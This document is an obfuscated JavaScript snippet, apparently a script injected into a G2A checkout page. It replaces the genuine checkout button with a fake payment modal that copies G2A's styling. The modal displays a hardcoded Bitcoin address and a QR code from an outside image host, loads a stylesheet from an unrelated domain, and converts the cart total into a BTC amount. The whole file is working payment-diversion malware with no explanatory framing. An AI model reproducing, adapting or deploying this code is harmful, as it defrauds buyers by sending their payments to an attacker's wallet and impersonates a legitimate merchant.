async function updateBTCPrice() {
  const _0x42d42f = Array.from(document.querySelectorAll('span')).find(_0x5ef54d => _0x5ef54d.textContent.trim().startsWith('$'));
  if (_0x42d42f) {
    const _0x13b0e2 = parseFloat(_0x42d42f.textContent.trim().replace('$', ''));
    if (!isNaN(_0x13b0e2)) {
      try {
        const _0x58b967 = await fetch("https://api.coindesk.com/v1/bpi/currentprice/USD.json");
        const _0x351a1c = await _0x58b967.json();
        const _0xf0c878 = parseFloat(_0x351a1c.bpi.USD.rate.replace(',', ''));
        if (!isNaN(_0xf0c878)) {
          const _0x2aa203 = (_0x13b0e2 / _0xf0c878).toFixed(0x8);
          const _0x487221 = document.getElementById("btcAmount");
          _0x487221.textContent = _0x2aa203;
        } else {
          console.error("...");
        }
      } catch (_0x24e012) {
        console.error("...", _0x24e012);
      }
    } else {
      console.error("...");
    }
  } else {
    console.error('...');
  }
}
function replaceButtonWithModal(_0xc40916, _0x463922, _0x569166, _0x15779b) {
  let _0xe6ac6b = document.evaluate(_0xc40916, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
  if (_0xe6ac6b) {
    let _0x4ad0f6 = document.createElement('button');
    _0x4ad0f6.textContent = _0xe6ac6b.textContent;
    _0x4ad0f6.className = _0x463922;
    _0xe6ac6b.parentNode.replaceChild(_0x4ad0f6, _0xe6ac6b);
    _0x4ad0f6.addEventListener("click", _0x3aa7cd => {
      _0x3aa7cd.preventDefault();
      const _0x4f1edc = document.createElement("div");
      _0x4f1edc.id = "modalOverlay";
      _0x4f1edc.style.position = "fixed";
      _0x4f1edc.style.top = '0';
      _0x4f1edc.style.left = '0';
      _0x4f1edc.style.width = "100%";
      _0x4f1edc.style.height = "100%";
      _0x4f1edc.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
      _0x4f1edc.style.display = 'flex';
      _0x4f1edc.style.alignItems = "center";
      _0x4f1edc.style.justifyContent = "center";
      _0x4f1edc.style.zIndex = "1000";
      document.body.appendChild(_0x4f1edc);
      const _0x5dddcb = document.createElement('div');
      _0x5dddcb.className = "g2a-modal";
      _0x5dddcb.innerHTML = _0x569166;
      _0x4f1edc.appendChild(_0x5dddcb);
      _0x4f1edc.addEventListener("click", _0x537b93 => {
        if (_0x537b93.target === _0x4f1edc) {
          document.body.removeChild(_0x4f1edc);
        }
      });
      const _0x4e95a1 = document.createElement("link");
      _0x4e95a1.rel = "stylesheet";
      _0x4e95a1.href = _0x15779b;
      document.head.appendChild(_0x4e95a1);
      updateBTCPrice();
    });
  } else {
    console.error("Button not found with the given XPath.");
  }
}
replaceButtonWithModal("/html/body/div[1]/div[1]/main/div[2]/section/div[2]/div/div/div/div[2]/section[3]/div[2]/div/button", "sc-iCoGMd ehJpkz indexes__ButtonContinue-sc-18h7v3q-1 dwifaY", "\n<img src=\"https://checkout.pay.g2a.com/zen_btc.png\" alt=\"Bitcoin\" class=\"g2a-logo\">\n<p><span class=\"g2a-grey-text\">BTC amount:</span> <span id=\"btcAmount\"></span></p>\n<p><span class=\"g2a-grey-text\">BTC address:</span>3Pfw3KQczztDRWcRs4hK9uCXaMDGSbTq2q</p>\n<img src=\"https://i.imgur.com/d7FU8zx.png\" alt=\"QR code to scan\" class=\"g2a-qr-code\">\n<p>Scan the QR code to complete your payment.</p>\n<p class=\"g2a-grey-text\"><small>Once you’ve done it, wait for your payment to confirm.</small></p>\n<button class=\"g2a-confirm-button\">Confirm payment</button>\n", "https://linkies.xyz/pazte/modal.css");
document.addEventListener("DOMContentLoaded", function () {
  const _0x4dc1dc = document.getElementById("modalOverlay");
  if (_0x4dc1dc) {
    updateBTCPrice();
  }
});